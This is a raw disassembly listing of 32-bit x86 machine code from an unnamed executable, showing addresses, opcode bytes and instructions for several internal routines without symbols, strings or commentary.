  40270d:	8b 44 24 04          	mov    0x4(%esp),%eax
  402711:	eb 02                	jmp    0x402715
  402713:	31 c0                	xor    %eax,%eax
  402715:	83 c4 08             	add    $0x8,%esp
  402718:	c2 08 00             	ret    $0x8
  40271b:	55                   	push   %ebp
  40271c:	53                   	push   %ebx
  40271d:	ba 11 00 00 00       	mov    $0x11,%edx
  402722:	83 ec 04             	sub    $0x4,%esp
  402725:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40272c:	4a                   	dec    %edx
  40272d:	75 f3                	jne    0x402722
  40272f:	e8 8c b8 00 00       	call   0x40dfc0
  402734:	8b 54 24 50          	mov    0x50(%esp),%edx
  402738:	8d 0c 24             	lea    (%esp),%ecx
  40273b:	e8 20 29 00 00       	call   0x405060
  402740:	e8 bb ed ff ff       	call   0x401500
  402745:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402749:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  402750:	00 
  402751:	eb 00                	jmp    0x402753
  402753:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402757:	3b 44 24 20          	cmp    0x20(%esp),%eax
  40275b:	0f 8c db 03 00 00    	jl     0x402b3c
  402761:	52                   	push   %edx
  402762:	e8 19 b7 00 00       	call   0x40de80
  402767:	5a                   	pop    %edx
  402768:	50                   	push   %eax
  402769:	52                   	push   %edx
  40276a:	e8 11 b7 00 00       	call   0x40de80
  40276f:	5a                   	pop    %edx
  402770:	50                   	push   %eax
  402771:	52                   	push   %edx
  402772:	e8 09 b7 00 00       	call   0x40de80
  402777:	5a                   	pop    %edx
  402778:	50                   	push   %eax
  402779:	52                   	push   %edx
  40277a:	e8 01 b7 00 00       	call   0x40de80
  40277f:	5a                   	pop    %edx
  402780:	50                   	push   %eax
  402781:	68 03 00 00 00       	push   $0x3
  402786:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  40278a:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  402790:	6b db 0c             	imul   $0xc,%ebx,%ebx
  402793:	01 dd                	add    %ebx,%ebp
  402795:	ff 75 04             	push   0x4(%ebp)
  402798:	e8 63 a9 00 00       	call   0x40d100
  40279d:	e8 e0 29 00 00       	call   0x405182
  4027a2:	01 14 24             	add    %edx,(%esp)
  4027a5:	e8 06 37 00 00       	call   0x405eb0
  4027aa:	8d 44 24 28          	lea    0x28(%esp),%eax
  4027ae:	50                   	push   %eax
  4027af:	e8 0c b7 00 00       	call   0x40dec0
  4027b4:	52                   	push   %edx
  4027b5:	e8 c6 b6 00 00       	call   0x40de80
  4027ba:	5a                   	pop    %edx
  4027bb:	50                   	push   %eax
  4027bc:	52                   	push   %edx
  4027bd:	e8 be b6 00 00       	call   0x40de80
  4027c2:	5a                   	pop    %edx
  4027c3:	50                   	push   %eax
  4027c4:	ff 74 24 2c          	push   0x2c(%esp)
  4027c8:	e8 43 36 00 00       	call   0x405e10
  4027cd:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4027d1:	50                   	push   %eax
  4027d2:	e8 e9 b6 00 00       	call   0x40dec0
  4027d7:	68 0a 00 00 00       	push   $0xa
  4027dc:	ff 74 24 28          	push   0x28(%esp)
  4027e0:	ff 35 54 80 41 00    	push   0x418054
  4027e6:	e8 f1 28 00 00       	call   0x4050dc
  4027eb:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4027ef:	68 0a 00 00 00       	push   $0xa
  4027f4:	ff 74 24 2c          	push   0x2c(%esp)
  4027f8:	ff 35 54 80 41 00    	push   0x418054
  4027fe:	e8 d9 28 00 00       	call   0x4050dc
  402803:	89 44 24 30          	mov    %eax,0x30(%esp)
  402807:	83 7c 24 2c 00       	cmpl   $0x0,0x2c(%esp)
  40280c:	0f 84 bd 00 00 00    	je     0x4028cf
  402812:	ff 74 24 2c          	push   0x2c(%esp)
  402816:	ff 35 54 80 41 00    	push   0x418054
  40281c:	e8 97 fe ff ff       	call   0x4026b8
  402821:	89 44 24 34          	mov    %eax,0x34(%esp)
  402825:	ff 74 24 34          	push   0x34(%esp)
  402829:	e8 c1 1e 00 00       	call   0x4046ef
  40282e:	99                   	cltd
  40282f:	52                   	push   %edx
  402830:	50                   	push   %eax
  402831:	8f 44 24 08          	pop    0x8(%esp)
  402835:	8f 44 24 08          	pop    0x8(%esp)
  402839:	8b 15 50 80 41 00    	mov    0x418050,%edx
  40283f:	52                   	push   %edx
  402840:	e8 3b b6 00 00       	call   0x40de80
  402845:	5a                   	pop    %edx
  402846:	50                   	push   %eax
  402847:	52                   	push   %edx
  402848:	e8 d3 b7 00 00       	call   0x40e020
  40284d:	8b 15 6c 80 41 00    	mov    0x41806c,%edx
  402853:	52                   	push   %edx
  402854:	e8 c7 b7 00 00       	call   0x40e020
  402859:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40285d:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  402863:	6b db 0c             	imul   $0xc,%ebx,%ebx
  402866:	01 dd                	add    %ebx,%ebp
  402868:	8b 55 04             	mov    0x4(%ebp),%edx
  40286b:	52                   	push   %edx
  40286c:	e8 af b7 00 00       	call   0x40e020
  402871:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402875:	50                   	push   %eax
  402876:	e8 45 b6 00 00       	call   0x40dec0
  40287b:	ff 35 48 80 41 00    	push   0x418048
  402881:	8b 44 24 08          	mov    0x8(%esp),%eax
  402885:	50                   	push   %eax
  402886:	ff 74 24 3c          	push   0x3c(%esp)
  40288a:	e8 4f e9 ff ff       	call   0x4011de
  40288f:	ff 74 24 08          	push   0x8(%esp)
  402893:	ff 74 24 08          	push   0x8(%esp)
  402897:	ff 74 24 3c          	push   0x3c(%esp)
  40289b:	ff 74 24 44          	push   0x44(%esp)
  40289f:	e8 5b 1e 00 00       	call   0x4046ff
  4028a4:	8b 1d 84 80 41 00    	mov    0x418084,%ebx
  4028aa:	83 fb 01             	cmp    $0x1,%ebx
  4028ad:	75 1b                	jne    0x4028ca
  4028af:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4028b3:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  4028b9:	6b db 0c             	imul   $0xc,%ebx,%ebx
  4028bc:	01 dd                	add    %ebx,%ebp
  4028be:	ff 75 00             	push   0x0(%ebp)
  4028c1:	ff 74 24 3c          	push   0x3c(%esp)
  4028c5:	e8 7b 7e 00 00       	call   0x40a745
  4028ca:	e9 ae 01 00 00       	jmp    0x402a7d
  4028cf:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  4028d4:	0f 84 24 01 00 00    	je     0x4029fe
  4028da:	ff 74 24 30          	push   0x30(%esp)
  4028de:	ff 35 54 80 41 00    	push   0x418054
  4028e4:	e8 cf fd ff ff       	call   0x4026b8
  4028e9:	89 44 24 34          	mov    %eax,0x34(%esp)
  4028ed:	ff 74 24 34          	push   0x34(%esp)
  4028f1:	e8 f9 1d 00 00       	call   0x4046ef
  4028f6:	99                   	cltd
  4028f7:	52                   	push   %edx
  4028f8:	50                   	push   %eax
  4028f9:	8f 44 24 08          	pop    0x8(%esp)
  4028fd:	8f 44 24 08          	pop    0x8(%esp)
  402901:	ff 35 48 80 41 00    	push   0x418048
  402907:	8b 44 24 08          	mov    0x8(%esp),%eax
  40290b:	50                   	push   %eax
  40290c:	ff 74 24 3c          	push   0x3c(%esp)
  402910:	e8 c9 e8 ff ff       	call   0x4011de
  402915:	ff 74 24 34          	push   0x34(%esp)
  402919:	e8 82 73 00 00       	call   0x409ca0
  40291e:	52                   	push   %edx
  40291f:	50                   	push   %eax
  402920:	8f 44 24 18          	pop    0x18(%esp)
  402924:	8f 44 24 18          	pop    0x18(%esp)
  402928:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  40292c:	83 c3 08             	add    $0x8,%ebx
  40292f:	53                   	push   %ebx
  402930:	e8 6b 73 00 00       	call   0x409ca0
  402935:	52                   	push   %edx
  402936:	50                   	push   %eax
  402937:	8f 44 24 10          	pop    0x10(%esp)
  40293b:	8f 44 24 10          	pop    0x10(%esp)
  40293f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402943:	50                   	push   %eax
  402944:	e8 57 72 00 00       	call   0x409ba0
  402949:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40294d:	8b 15 50 80 41 00    	mov    0x418050,%edx
  402953:	52                   	push   %edx
  402954:	e8 27 b5 00 00       	call   0x40de80
  402959:	5a                   	pop    %edx
  40295a:	50                   	push   %eax
  40295b:	52                   	push   %edx
  40295c:	e8 bf b6 00 00       	call   0x40e020
  402961:	8b 15 6c 80 41 00    	mov    0x41806c,%edx
  402967:	52                   	push   %edx
  402968:	e8 b3 b6 00 00       	call   0x40e020
  40296d:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402971:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  402977:	6b db 0c             	imul   $0xc,%ebx,%ebx
  40297a:	01 dd                	add    %ebx,%ebp
  40297c:	8b 55 04             	mov    0x4(%ebp),%edx
  40297f:	52                   	push   %edx
  402980:	e8 9b b6 00 00       	call   0x40e020
  402985:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402989:	50                   	push   %eax
  40298a:	e8 31 b5 00 00       	call   0x40dec0
  40298f:	83 7c 24 3c 00       	cmpl   $0x0,0x3c(%esp)
  402994:	74 66                	je     0x4029fc
  402996:	8b 44 24 14          	mov    0x14(%esp),%eax
  40299a:	50                   	push   %eax
  40299b:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  40299f:	83 c3 10             	add    $0x10,%ebx
  4029a2:	53                   	push   %ebx
  4029a3:	8d 44 24 14          	lea    0x14(%esp),%eax
  4029a7:	50                   	push   %eax
  4029a8:	ff 74 24 48          	push   0x48(%esp)
  4029ac:	e8 0f be 00 00       	call   0x40e7c0
  4029b1:	83 c4 10             	add    $0x10,%esp
  4029b4:	89 44 24 40          	mov    %eax,0x40(%esp)
  4029b8:	ff 74 24 10          	push   0x10(%esp)
  4029bc:	ff 74 24 10          	push   0x10(%esp)
  4029c0:	ff 74 24 44          	push   0x44(%esp)
  4029c4:	ff 74 24 44          	push   0x44(%esp)
  4029c8:	e8 32 1d 00 00       	call   0x4046ff
  4029cd:	8b 1d 84 80 41 00    	mov    0x418084,%ebx
  4029d3:	83 fb 01             	cmp    $0x1,%ebx
  4029d6:	75 1b                	jne    0x4029f3
  4029d8:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4029dc:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  4029e2:	6b db 0c             	imul   $0xc,%ebx,%ebx
  4029e5:	01 dd                	add    %ebx,%ebp
  4029e7:	ff 75 00             	push   0x0(%ebp)
  4029ea:	ff 74 24 3c          	push   0x3c(%esp)
  4029ee:	e8 52 7d 00 00       	call   0x40a745
  4029f3:	ff 74 24 3c          	push   0x3c(%esp)
  4029f7:	e8 84 71 00 00       	call   0x409b80
  4029fc:	eb 7f                	jmp    0x402a7d
  4029fe:	8b 15 50 80 41 00    	mov    0x418050,%edx
  402a04:	52                   	push   %edx
  402a05:	e8 76 b4 00 00       	call   0x40de80
  402a0a:	5a                   	pop    %edx
  402a0b:	50                   	push   %eax
  402a0c:	52                   	push   %edx
  402a0d:	e8 0e b6 00 00       	call   0x40e020
  402a12:	8b 15 6c 80 41 00    	mov    0x41806c,%edx
  402a18:	52                   	push   %edx
  402a19:	e8 02 b6 00 00       	call   0x40e020
  402a1e:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402a22:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  402a28:	6b db 0c             	imul   $0xc,%ebx,%ebx
  402a2b:	01 dd                	add    %ebx,%ebp
  402a2d:	8b 55 04             	mov    0x4(%ebp),%edx
  402a30:	52                   	push   %edx
  402a31:	e8 ea b5 00 00       	call   0x40e020
  402a36:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402a3a:	50                   	push   %eax
  402a3b:	e8 80 b4 00 00       	call   0x40dec0
  402a40:	68 00 00 00 00       	push   $0x0
  402a45:	68 00 00 00 00       	push   $0x0
  402a4a:	ff 74 24 44          	push   0x44(%esp)
  402a4e:	ff 74 24 44          	push   0x44(%esp)
  402a52:	e8 a8 1c 00 00       	call   0x4046ff
  402a57:	8b 1d 84 80 41 00    	mov    0x418084,%ebx
  402a5d:	83 fb 01             	cmp    $0x1,%ebx
  402a60:	75 1b                	jne    0x402a7d
  402a62:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402a66:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  402a6c:	6b db 0c             	imul   $0xc,%ebx,%ebx
  402a6f:	01 dd                	add    %ebx,%ebp
  402a71:	ff 75 00             	push   0x0(%ebp)
  402a74:	ff 74 24 3c          	push   0x3c(%esp)
  402a78:	e8 c8 7c 00 00       	call   0x40a745
  402a7d:	ff 74 24 38          	push   0x38(%esp)
  402a81:	e8 15 fa ff ff       	call   0x40249b
  402a86:	21 c0                	and    %eax,%eax
  402a88:	0f 84 a4 00 00 00    	je     0x402b32
  402a8e:	8b 1d 80 80 41 00    	mov    0x418080,%ebx
  402a94:	43                   	inc    %ebx
  402a95:	89 1d 80 80 41 00    	mov    %ebx,0x418080
  402a9b:	52                   	push   %edx
  402a9c:	e8 df b3 00 00       	call   0x40de80
  402aa1:	5a                   	pop    %edx
  402aa2:	50                   	push   %eax
  402aa3:	52                   	push   %edx
  402aa4:	e8 d7 b3 00 00       	call   0x40de80
  402aa9:	5a                   	pop    %edx
  402aaa:	50                   	push   %eax
  402aab:	ff 74 24 40          	push   0x40(%esp)
  402aaf:	e8 46 01 00 00       	call   0x402bfa
  402ab4:	e8 c7 b5 00 00       	call   0x40e080
  402ab9:	8b 15 88 80 41 00    	mov    0x418088,%edx
  402abf:	52                   	push   %edx
  402ac0:	e8 bb b3 00 00       	call   0x40de80
  402ac5:	5a                   	pop    %edx
  402ac6:	50                   	push   %eax
  402ac7:	52                   	push   %edx
  402ac8:	e8 53 b5 00 00       	call   0x40e020
  402acd:	52                   	push   %edx
  402ace:	e8 ad b3 00 00       	call   0x40de80
  402ad3:	5a                   	pop    %edx
  402ad4:	50                   	push   %eax
  402ad5:	52                   	push   %edx
  402ad6:	e8 a5 b3 00 00       	call   0x40de80
  402adb:	5a                   	pop    %edx
  402adc:	50                   	push   %eax
  402add:	a1 80 80 41 00       	mov    0x418080,%eax
  402ae2:	99                   	cltd
  402ae3:	52                   	push   %edx
  402ae4:	50                   	push   %eax
  402ae5:	e8 76 36 00 00       	call   0x406160
  402aea:	58                   	pop    %eax
  402aeb:	e8 92 26 00 00       	call   0x405182
  402af0:	01 14 24             	add    %edx,(%esp)
  402af3:	e8 8a 26 00 00       	call   0x405182
  402af8:	01 54 24 04          	add    %edx,0x4(%esp)
  402afc:	e8 bf 6d 00 00       	call   0x4098c0
  402b01:	e8 9a 26 00 00       	call   0x4051a0
  402b06:	ff 35 a8 80 41 00    	push   0x4180a8
  402b0c:	e8 e3 79 00 00       	call   0x40a4f4
  402b11:	8b 54 24 38          	mov    0x38(%esp),%edx
  402b15:	52                   	push   %edx
  402b16:	e8 65 b3 00 00       	call   0x40de80
  402b1b:	5a                   	pop    %edx
  402b1c:	50                   	push   %eax
  402b1d:	52                   	push   %edx
  402b1e:	e8 fd b4 00 00       	call   0x40e020
  402b23:	8b 2d ac 80 41 00    	mov    0x4180ac,%ebp
  402b29:	8d 45 08             	lea    0x8(%ebp),%eax
  402b2c:	50                   	push   %eax
  402b2d:	e8 8e b3 00 00       	call   0x40dec0
  402b32:	ff 44 24 20          	incl   0x20(%esp)
  402b36:	0f 81 17 fc ff ff    	jno    0x402753
  402b3c:	ff 74 24 34          	push   0x34(%esp)
  402b40:	e8 3b 70 00 00       	call   0x409b80
  402b45:	52                   	push   %edx
  402b46:	e8 35 b3 00 00       	call   0x40de80
  402b4b:	5a                   	pop    %edx
  402b4c:	50                   	push   %eax
  402b4d:	52                   	push   %edx
  402b4e:	e8 2d b3 00 00       	call   0x40de80
  402b53:	5a                   	pop    %edx
  402b54:	50                   	push   %eax
  402b55:	52                   	push   %edx
  402b56:	e8 25 b3 00 00       	call   0x40de80
  402b5b:	5a                   	pop    %edx
  402b5c:	50                   	push   %eax
  402b5d:	a1 80 80 41 00       	mov    0x418080,%eax
  402b62:	99                   	cltd
  402b63:	52                   	push   %edx
  402b64:	50                   	push   %eax
  402b65:	e8 f6 35 00 00       	call   0x406160
  402b6a:	e8 11 b5 00 00       	call   0x40e080
  402b6f:	ff 35 38 80 41 00    	push   0x418038
  402b75:	e8 08 26 00 00       	call   0x405182
  402b7a:	01 54 24 04          	add    %edx,0x4(%esp)
  402b7e:	e8 3d 6d 00 00       	call   0x4098c0
  402b83:	e8 18 26 00 00       	call   0x4051a0
  402b88:	e8 73 e9 ff ff       	call   0x401500
  402b8d:	b8 01 00 00 00       	mov    $0x1,%eax
  402b92:	eb 02                	jmp    0x402b96
  402b94:	31 c0                	xor    %eax,%eax
  402b96:	ff 74 24 24          	push   0x24(%esp)
  402b9a:	e8 b1 b3 00 00       	call   0x40df50
  402b9f:	ff 74 24 28          	push   0x28(%esp)
  402ba3:	e8 a8 b3 00 00       	call   0x40df50
  402ba8:	ff 74 24 38          	push   0x38(%esp)
  402bac:	e8 9f b3 00 00       	call   0x40df50
  402bb1:	ff 34 24             	push   (%esp)
  402bb4:	e8 97 b3 00 00       	call   0x40df50
  402bb9:	83 c4 44             	add    $0x44,%esp
  402bbc:	5b                   	pop    %ebx
  402bbd:	5d                   	pop    %ebp
  402bbe:	c2 04 00             	ret    $0x4
  402bc1:	55                   	push   %ebp
  402bc2:	ba 09 00 00 00       	mov    $0x9,%edx
  402bc7:	83 ec 04             	sub    $0x4,%esp
  402bca:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402bd1:	4a                   	dec    %edx
  402bd2:	75 f3                	jne    0x402bc7
  402bd4:	e8 e7 b3 00 00       	call   0x40dfc0
  402bd9:	8d 04 24             	lea    (%esp),%eax
  402bdc:	50                   	push   %eax
  402bdd:	e8 00 25 00 00       	call   0x4050e2
  402be2:	8d 2c 24             	lea    (%esp),%ebp
  402be5:	66 83 7d 00 00       	cmpw   $0x0,0x0(%ebp)
  402bea:	74 07                	je     0x402bf3
  402bec:	b8 01 00 00 00       	mov    $0x1,%eax
  402bf1:	eb 02                	jmp    0x402bf5
  402bf3:	31 c0                	xor    %eax,%eax
  402bf5:	83 c4 24             	add    $0x24,%esp
  402bf8:	5d                   	pop    %ebp
  402bf9:	c3                   	ret
  402bfa:	31 c0                	xor    %eax,%eax
  402bfc:	50                   	push   %eax
  402bfd:	50                   	push   %eax
  402bfe:	50                   	push   %eax
  402bff:	e8 bc b3 00 00       	call   0x40dfc0
  402c04:	ff 74 24 14          	push   0x14(%esp)
  402c08:	e8 93 25 00 00       	call   0x4051a0
  402c0d:	8b 54 24 10          	mov    0x10(%esp),%edx
  402c11:	8d 0c 24             	lea    (%esp),%ecx
  402c14:	e8 47 24 00 00       	call   0x405060
  402c19:	68 10 27 00 00       	push   $0x2710
  402c1e:	e8 7d 6f 00 00       	call   0x409ba0
  402c23:	89 44 24 04          	mov    %eax,0x4(%esp)
  402c27:	68 10 27 00 00       	push   $0x2710
  402c2c:	ff 74 24 08          	push   0x8(%esp)
  402c30:	ff 74 24 08          	push   0x8(%esp)
  402c34:	e8 af 24 00 00       	call   0x4050e8
  402c39:	52                   	push   %edx
  402c3a:	e8 41 b2 00 00       	call   0x40de80
  402c3f:	5a                   	pop    %edx
  402c40:	50                   	push   %eax
  402c41:	52                   	push   %edx
  402c42:	e8 39 b2 00 00       	call   0x40de80
  402c47:	5a                   	pop    %edx
  402c48:	50                   	push   %eax
  402c49:	68 ff ff ff ff       	push   $0xffffffff
  402c4e:	ff 74 24 10          	push   0x10(%esp)
  402c52:	e8 b9 6f 00 00       	call   0x409c10
  402c57:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402c5b:	50                   	push   %eax
  402c5c:	e8 5f b2 00 00       	call   0x40dec0
  402c61:	ff 74 24 04          	push   0x4(%esp)
  402c65:	e8 16 6f 00 00       	call   0x409b80
  402c6a:	8b 54 24 08          	mov    0x8(%esp),%edx
  402c6e:	52                   	push   %edx
  402c6f:	e8 0c b2 00 00       	call   0x40de80
  402c74:	5a                   	pop    %edx
  402c75:	50                   	push   %eax
  402c76:	52                   	push   %edx
  402c77:	e8 a4 b3 00 00       	call   0x40e020
  402c7c:	58                   	pop    %eax
  402c7d:	50                   	push   %eax
  402c7e:	e8 ed 24 00 00       	call   0x405170
  402c83:	5a                   	pop    %edx
  402c84:	01 d0                	add    %edx,%eax
  402c86:	eb 0a                	jmp    0x402c92
  402c88:	e8 23 b4 00 00       	call   0x40e0b0
  402c8d:	66 c7 00 00 00       	movw   $0x0,(%eax)
  402c92:	ff 34 24             	push   (%esp)
  402c95:	e8 b6 b2 00 00       	call   0x40df50
  402c9a:	ff 74 24 08          	push   0x8(%esp)
  402c9e:	e8 ad b2 00 00       	call   0x40df50
  402ca3:	83 c4 0c             	add    $0xc,%esp
  402ca6:	c2 04 00             	ret    $0x4
  402ca9:	53                   	push   %ebx
  402caa:	31 c0                	xor    %eax,%eax
  402cac:	50                   	push   %eax
  402cad:	50                   	push   %eax
  402cae:	50                   	push   %eax
  402caf:	50                   	push   %eax
  402cb0:	50                   	push   %eax
  402cb1:	50                   	push   %eax
  402cb2:	e8 09 b3 00 00       	call   0x40dfc0
  402cb7:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cbb:	8d 0c 24             	lea    (%esp),%ecx
  402cbe:	e8 9d 23 00 00       	call   0x405060
  402cc3:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  402cc7:	83 fb 01             	cmp    $0x1,%ebx
  402cca:	75 24                	jne    0x402cf0
  402ccc:	52                   	push   %edx
  402ccd:	e8 ae b1 00 00       	call   0x40de80
  402cd2:	5a                   	pop    %edx
  402cd3:	50                   	push   %eax
  402cd4:	52                   	push   %edx
  402cd5:	e8 a6 b1 00 00       	call   0x40de80
  402cda:	5a                   	pop    %edx
  402cdb:	50                   	push   %eax
  402cdc:	8b 44 24 08          	mov    0x8(%esp),%eax
  402ce0:	50                   	push   %eax
  402ce1:	e8 da 6e 00 00       	call   0x409bc0
  402ce6:	8d 44 24 04          	lea    0x4(%esp),%eax
  402cea:	50                   	push   %eax
  402ceb:	e8 d0 b1 00 00       	call   0x40dec0
  402cf0:	52                   	push   %edx
  402cf1:	e8 8a b1 00 00       	call   0x40de80
  402cf6:	5a                   	pop    %edx
  402cf7:	50                   	push   %eax
  402cf8:	52                   	push   %edx
  402cf9:	e8 82 b1 00 00       	call   0x40de80
  402cfe:	5a                   	pop    %edx
  402cff:	50                   	push   %eax
  402d00:	52                   	push   %edx
  402d01:	e8 7a b1 00 00       	call   0x40de80
  402d06:	5a                   	pop    %edx
  402d07:	50                   	push   %eax
  402d08:	52                   	push   %edx
  402d09:	e8 72 b1 00 00       	call   0x40de80
  402d0e:	5a                   	pop    %edx
  402d0f:	50                   	push   %eax
  402d10:	68 01 00 00 00       	push   $0x1
  402d15:	ff 74 24 14          	push   0x14(%esp)
  402d19:	e8 e2 a3 00 00       	call   0x40d100
  402d1e:	e8 5f 24 00 00       	call   0x405182
  402d23:	01 14 24             	add    %edx,(%esp)
  402d26:	e8 85 31 00 00       	call   0x405eb0
  402d2b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402d2f:	50                   	push   %eax
  402d30:	e8 8b b1 00 00       	call   0x40dec0
  402d35:	68 0a 00 00 00       	push   $0xa
  402d3a:	ff 74 24 0c          	push   0xc(%esp)
  402d3e:	ff 35 54 80 41 00    	push   0x418054
  402d44:	e8 93 23 00 00       	call   0x4050dc
  402d49:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402d4d:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402d52:	0f 84 ac 00 00 00    	je     0x402e04
  402d58:	ff 74 24 0c          	push   0xc(%esp)
  402d5c:	ff 35 54 80 41 00    	push   0x418054
  402d62:	e8 51 f9 ff ff       	call   0x4026b8
  402d67:	89 44 24 10          	mov    %eax,0x10(%esp)
  402d6b:	ff 74 24 10          	push   0x10(%esp)
  402d6f:	e8 7b 19 00 00       	call   0x4046ef
  402d74:	a3 20 80 41 00       	mov    %eax,0x418020
  402d79:	ff 35 48 80 41 00    	push   0x418048
  402d7f:	ff 35 20 80 41 00    	push   0x418020
  402d85:	ff 74 24 18          	push   0x18(%esp)
  402d89:	e8 50 e4 ff ff       	call   0x4011de
  402d8e:	52                   	push   %edx
  402d8f:	e8 ec b0 00 00       	call   0x40de80
  402d94:	5a                   	pop    %edx
  402d95:	50                   	push   %eax
  402d96:	52                   	push   %edx
  402d97:	e8 e4 b0 00 00       	call   0x40de80
  402d9c:	5a                   	pop    %edx
  402d9d:	50                   	push   %eax
  402d9e:	ff 35 20 80 41 00    	push   0x418020
  402da4:	ff 74 24 1c          	push   0x1c(%esp)
  402da8:	e8 63 6e 00 00       	call   0x409c10
  402dad:	8d 05 24 80 41 00    	lea    0x418024,%eax
  402db3:	50                   	push   %eax
  402db4:	e8 07 b1 00 00       	call   0x40dec0
  402db9:	ff 74 24 10          	push   0x10(%esp)
  402dbd:	e8 be 6d 00 00       	call   0x409b80
  402dc2:	b8 3e 70 41 00       	mov    $0x41703e,%eax
  402dc7:	50                   	push   %eax
  402dc8:	ff 35 24 80 41 00    	push   0x418024
  402dce:	e8 ed 2b 00 00       	call   0x4059c0
  402dd3:	89 44 24 14          	mov    %eax,0x14(%esp)
  402dd7:	52                   	push   %edx
  402dd8:	e8 a3 b0 00 00       	call   0x40de80
  402ddd:	5a                   	pop    %edx
  402dde:	50                   	push   %eax
  402ddf:	52                   	push   %edx
  402de0:	e8 9b b0 00 00       	call   0x40de80
  402de5:	5a                   	pop    %edx
  402de6:	50                   	push   %eax
  402de7:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  402deb:	4b                   	dec    %ebx
  402dec:	53                   	push   %ebx
  402ded:	ff 35 24 80 41 00    	push   0x418024
  402df3:	e8 28 31 00 00       	call   0x405f20
  402df8:	8d 05 24 80 41 00    	lea    0x418024,%eax
  402dfe:	50                   	push   %eax
  402dff:	e8 bc b0 00 00       	call   0x40dec0
  402e04:	8b 15 24 80 41 00    	mov    0x418024,%edx
  402e0a:	31 c9                	xor    %ecx,%ecx
  402e0c:	e8 0f 23 00 00       	call   0x405120
  402e11:	75 28                	jne    0x402e3b
  402e13:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  402e17:	83 fb 01             	cmp    $0x1,%ebx
  402e1a:	75 17                	jne    0x402e33
  402e1c:	8b 04 24             	mov    (%esp),%eax
  402e1f:	50                   	push   %eax
  402e20:	8d 05 1b 27 40 00    	lea    0x40271b,%eax
  402e26:	50                   	push   %eax
  402e27:	e8 66 26 00 00       	call   0x405492
  402e2c:	a3 18 80 41 00       	mov    %eax,0x418018
  402e31:	eb 08                	jmp    0x402e3b
  402e33:	ff 34 24             	push   (%esp)
  402e36:	e8 e0 f8 ff ff       	call   0x40271b
  402e3b:	eb 02                	jmp    0x402e3f
  402e3d:	31 c0                	xor    %eax,%eax
  402e3f:	ff 34 24             	push   (%esp)
  402e42:	e8 09 b1 00 00       	call   0x40df50
  402e47:	ff 74 24 08          	push   0x8(%esp)
  402e4b:	e8 00 b1 00 00       	call   0x40df50
  402e50:	83 c4 18             	add    $0x18,%esp
  402e53:	5b                   	pop    %ebx
  402e54:	c2 04 00             	ret    $0x4
  402e57:	55                   	push   %ebp
  402e58:	e8 63 b1 00 00       	call   0x40dfc0
  402e5d:	ff 35 b0 80 41 00    	push   0x4180b0
  402e63:	e8 8c 76 00 00       	call   0x40a4f4
  402e68:	52                   	push   %edx
  402e69:	e8 12 b0 00 00       	call   0x40de80
  402e6e:	5a                   	pop    %edx
  402e6f:	50                   	push   %eax
  402e70:	52                   	push   %edx
  402e71:	e8 0a b0 00 00       	call   0x40de80
  402e76:	5a                   	pop    %edx
  402e77:	50                   	push   %eax
  402e78:	ff 74 24 18          	push   0x18(%esp)
  402e7c:	e8 3f 6d 00 00       	call   0x409bc0
  402e81:	8b 2d b4 80 41 00    	mov    0x4180b4,%ebp
  402e87:	8d 45 08             	lea    0x8(%ebp),%eax
  402e8a:	50                   	push   %eax
  402e8b:	e8 30 b0 00 00       	call   0x40dec0
  402e90:	b8 01 00 00 00       	mov    $0x1,%eax
  402e95:	eb 02                	jmp    0x402e99
  402e97:	31 c0                	xor    %eax,%eax
  402e99:	5d                   	pop    %ebp
  402e9a:	c2 10 00             	ret    $0x10
  402e9d:	31 c0                	xor    %eax,%eax
  402e9f:	50                   	push   %eax
  402ea0:	50                   	push   %eax
  402ea1:	50                   	push   %eax
  402ea2:	50                   	push   %eax
  402ea3:	50                   	push   %eax
  402ea4:	50                   	push   %eax
  402ea5:	e8 16 b1 00 00       	call   0x40dfc0
  402eaa:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402eae:	8d 0c 24             	lea    (%esp),%ecx
  402eb1:	e8 aa 21 00 00       	call   0x405060
  402eb6:	68 0a 00 00 00       	push   $0xa
  402ebb:	ff 74 24 04          	push   0x4(%esp)
  402ebf:	ff 35 54 80 41 00    	push   0x418054
  402ec5:	e8 12 22 00 00       	call   0x4050dc
  402eca:	89 44 24 04          	mov    %eax,0x4(%esp)
  402ece:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  402ed3:	74 21                	je     0x402ef6
  402ed5:	ff 74 24 04          	push   0x4(%esp)
  402ed9:	ff 35 54 80 41 00    	push   0x418054
  402edf:	e8 d4 f7 ff ff       	call   0x4026b8
  402ee4:	89 44 24 08          	mov    %eax,0x8(%esp)
